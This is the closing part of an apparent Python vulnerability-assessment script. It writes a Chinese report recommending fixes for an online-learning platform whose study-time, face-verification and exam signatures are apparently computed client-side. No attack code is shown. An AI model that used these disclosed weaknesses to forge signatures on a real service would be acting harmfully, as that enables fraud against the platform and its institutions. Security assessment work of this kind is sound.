    rp.append("---\n## 六、修复建议\n")
    rp.append("### 6.1 紧急修复（CRITICAL）\n")
    rp.append("1. **服务端身份绑定校验**: 所有签名校验必须同时验证签名中的userId与请求者Cookie/Token中的身份一致性\n")
    rp.append("2. **迁移签名计算到服务端**: 视频/音频学时、人脸验证、阅读任务的签名应由服务端生成\n")
    rp.append("3. **考试签名重构**: 使用服务端动态密钥，客户端仅传递操作数据\n")
    rp.append("4. **人脸验证流程重构**: enc签名应由服务端生成并下发，客户端仅使用一次性签名\n\n")

    rp.append("### 6.2 中期加固（HIGH）\n")
    rp.append("5. **Token动态化**: 移除全局Token(K6)，使用动态Token+用户绑定\n")
    rp.append("6. **API访问控制**: 实施基于角色的访问控制(RBAC)，校验用户是否有权访问特定课程/作业/考试\n")
    rp.append("7. **cpi参数校验**: 校验cpi与请求者身份的绑定关系，防止跨用户cpi访问\n")
    rp.append("8. **JWT签名密钥强化**: 确保HS256签名密钥为高强度随机密钥\n")
    rp.append("9. **清除源码硬编码Cookie**: 移除所有硬编码的Cookie和JWT令牌\n\n")

    rp.append("### 6.3 长期优化（MEDIUM）\n")
    rp.append("10. **零信任架构**: 不信任任何客户端签名，所有敏感操作需服务端二次验证\n")
    rp.append("11. **行为分析**: 增加服务端行为分析，检测异常请求模式\n")
    rp.append("12. **密钥轮换**: 建立定期密钥轮换机制\n")
    rp.append("13. **请求频率限制**: 对学时提交、人脸验证等敏感操作增加频率限制\n")

    with open(REPORT, "w", encoding="utf-8") as f:
        f.write("\n".join(rp))
    print(f"  报告: {REPORT}")
    print(f"  共{tc}项, {vc}项隐患")
    print(f"  CRITICAL={len(vs['CRITICAL'])}, HIGH={len(vs['HIGH'])}, MEDIUM={len(vs['MEDIUM'])}, LOW={len(vs['LOW'])}")
    print("="*70)

if __name__ == "__main__":
    import urllib3; urllib3.disable_warnings()
    run()
